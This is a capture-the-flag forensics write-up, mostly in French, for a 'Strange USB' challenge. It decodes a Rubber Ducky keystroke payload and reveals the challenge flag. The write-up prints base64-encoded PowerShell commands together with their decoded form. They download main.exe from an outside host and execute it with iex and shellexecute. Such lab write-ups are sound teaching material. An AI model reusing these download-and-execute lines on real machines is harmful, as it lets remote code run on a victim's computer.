### Strange USB
**Category:** Forensics - **Difficulty:** Easy    
**Description:**  
Where the flag can be hidden? The PDF file is a bit strange but the flag is apparently present.  
My **French** colleague found strange equipment on his computer. What could it be?

**Solution:**  
Pour résoudre ce challenge, il faut prendre le titre en compte ainsi que le [fichier .bin](./pro.bin).  
En cherchant sur internet les termes *USB*, *.bin* et *strange* on tombe plus ou moins rapidement sur des articles de Rubber Ducky.  
En allant un peu plus loin, on voit qu'effectivement les fichiers mis sur les Rubber Ducky sont des fichier .bin.  
Il faut donc utiliser des décodeur comme celui-ci : [DuckToolKit](https://ducktoolkit.com/decode#) pour voir le contenu en clair du fichier.  
Si nous uploadons simplement le fichier sans changer aucun paramètres, le code ne voudra pas dire grand chose...  
En effet, il faut changer le langage en français (grâce à l'indice dans la description). Avec ça, le code est plus compréhensible :  
![image](https://user-images.githubusercontent.com/91023285/187074877-4ba59336-50cc-46c4-a52f-e35f790b44e4.png)  

On voit déjà une URL vers une image : [https://developwebpro.fr/DVC/files/168793745812685/step.png](https://developwebpro.fr/DVC/files/168793745812685/step.png)  
Ici ça n'est pas très utile de voir cela...  

Cependant, à la fin du fichier, il y a des commandes PowerShell. Encodées en *Base64* il faut les décrypter pour voir la commande exacte :  
- `aWV4IChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHBzOi8vZGV2ZWxvcHdlYnByby5mci9EVkMvZmlsZXMvNDU4NzMxMjY1ODk0MjY4L21haW4uZXhlJywnbWFpbi5leGUnKTs` : `iex (New-Object System.Net.WebClient).DownloadFile('https://developwebpro.fr/DVC/files/458731265894268/main.exe','main.exe');`
- `aWV4IChOZXctT2JqZWN0IC1jb20gc2hlbGwuYXBwbGljYXRpb24pLnNoZWxsZXhlY3V0ZSgnbWFpbi5leGUnKTs` : `iex (New-Object -com shell.application).shellexecute('main.exe');`  

La première commande va télécharger un programme .exe sur une URL précise puis dans un deuxième temps, le fichier est exécuté.  
Essayons de télécharger ce fichier .exe pour voir.  

⚠️ Soit on peut l'exécuter directement sur notre machine (à nos risques et périls, bien qu'ici il s'agisse d'un CTF) ou alors faire un `strings` sur le fichier :  

En l'éxécutant :  
![image](https://user-images.githubusercontent.com/91023285/187075194-250a0b33-ecdf-4923-9020-c87a78d0addb.png)  

En faisant un `strings` dessus :  
![image](https://user-images.githubusercontent.com/91023285/187075477-484e6590-b894-4753-8b33-1b91d61770b2.png)  

<details>
  <summary>:triangular_flag_on_post: FLAG</summary>

  ```
  DVC{u5B_4R3_D4n93r0U5}
  ```
</details>
